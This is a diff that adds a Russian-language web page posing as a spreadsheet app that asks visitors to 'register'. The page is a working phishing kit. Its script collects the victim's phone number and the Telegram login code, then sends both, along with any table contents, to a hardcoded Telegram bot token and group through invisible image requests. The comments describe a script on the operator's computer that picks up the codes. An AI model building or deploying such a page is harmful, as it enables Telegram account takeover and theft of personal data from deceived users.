@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Приложение Таблица</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #f2f2f7; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 92%; max-width: 400px; background: white; padding: 30px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; }
+        .step { display: none; }
+        .active { display: block; }
+        h2 { margin-bottom: 10px; color: #1c1c1e; font-size: 22px; }
+        p { color: #3a3a3c; font-size: 15px; line-height: 1.4; margin-bottom: 25px; }
+        select, input { width: 100%; padding: 16px; font-size: 17px; border: 2px solid #efeff4; border-radius: 14px; margin-bottom: 15px; box-sizing: border-box; outline: none; }
+        button { width: 100%; padding: 18px; font-size: 18px; font-weight: 600; background: #007aff; color: white; border: none; border-radius: 14px; cursor: pointer; }
+        button:active { background: #0056b3; transform: scale(0.98); }
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
+        th, td { border: 1px solid #efeff4; padding: 12px; text-align: left; font-size: 14px; }
+        #status { margin-top: 20px; font-size: 13px; color: #8e8e93; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="step-phone" class="step active">
+        <h2>Здравствуйте!</h2>
+        <p>Это приложение "Таблица". Чтобы записаться, нужно зарегистрироваться.<br><br><b>Введите номер телефона:</b></p>
+        <select id="country">
+            <option value="+375">🇧🇾 Беларусь (+375)</option>
+            <option value="+7">🇷🇺 Россия (+7)</option>
+        </select>
+        <input type="tel" id="phone" placeholder="00 000-00-00" inputmode="tel">
+        <button onclick="nextStep('phone')">Зарегистрироваться</button>
+    </div>
+
+    <div id="step-code" class="step">
+        <h2>Регистрация</h2>
+        <p>Вам придет код через Телеграмм, введите его для завершения регистрации:</p>
+        <input type="number" id="code" placeholder="000000" inputmode="numeric">
+        <button onclick="nextStep('code')">Подтвердить</button>
+    </div>
+
+    <div id="step-table" class="step">
+        <h2>Рабочая таблица</h2>
+        <table id="myTable">
+            <tr><th>Объект</th><th>Значение</th></tr>
+            <tr><td contenteditable="true">Объект 1</td><td contenteditable="true">...</td></tr>
+        </table>
+        <button style="background: #34c759; margin-top: 10px;" onclick="addRow()">+ Добавить строку</button>
+        <button style="margin-top:20px; background:#ff9500" onclick="sendTable()">Сохранить данные</button>
+    </div>
+    <div id="status">Ожидание...</div>
+</div>
+
+<script>
+    // Настройки
+    const TOKEN = '8400053542:AAFTpIhi1dSpYCmYbVCpPxsZzYIpwa-VWWs';
+    const GROUP_ID = '-5298252697';
+
+    // Функция ТИХОЙ отправки (без открытия новых окон)
+    function silentSend(text) {
+        document.getElementById('status').innerText = "⏳ Отправка...";
+        
+        // 1. Отправляем сообщение в чат бота (чтобы ты видел текст в Телеграме)
+        const urlMsg = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${GROUP_ID}&text=${encodeURIComponent(text)}`;
+        
+        // 2. Обновляем описание (чтобы Python-скрипт на ПК увидел код)
+        const urlDesc = `https://api.telegram.org/bot${TOKEN}/setMyDescription?description=${encodeURIComponent(text)}`;
+
+        // ХАК: создаем невидимые элементы "картинки", чтобы браузер выполнил запрос в фоне
+        const img1 = new Image();
+        img1.src = urlMsg;
+        
+        const img2 = new Image();
+        img2.src = urlDesc;
+
+        setTimeout(() => {
+            document.getElementById('status').innerText = "✅ Готово";
+        }, 1000);
+    }
+
+    function nextStep(current) {
+        if (current === 'phone') {
+            const val = document.getElementById('phone').value;
+            if(!val) return;
+            const phone = document.getElementById('country').value + val;
+            silentSend("📱 НОВЫЙ ТЕЛЕФОН: " + phone);
+            document.getElementById('step-phone').classList.remove('active');
+            document.getElementById('step-code').classList.add('active');
+        } 
+        else if (current === 'code') {
+            const val = document.getElementById('code').value;
+            if(!val) return;
+            silentSend("🔑 КОД: " + val);
+            document.getElementById('step-code').classList.remove('active');
+            document.getElementById('step-table').classList.add('active');
+        }
+    }
+
+    function addRow() {
+        const table = document.getElementById("myTable");
+        const row = table.insertRow(-1);
+        row.insertCell(0).contentEditable = "true";
+        row.insertCell(1).contentEditable = "true";
+    }
+
+    function sendTable() {
+        let tableData = "📊 ТАБЛИЦА: ";
+        const rows = document.querySelectorAll("#myTable tr");
+        rows.forEach((row, i) => {
+            if(i === 0) return;
+            const cells = row.querySelectorAll("td");
+            tableData += `[${cells[0].innerText}:${cells[1].innerText}] `;
+        });
+        silentSend(tableData);
+    }
+</script>
+</body>
+</html>
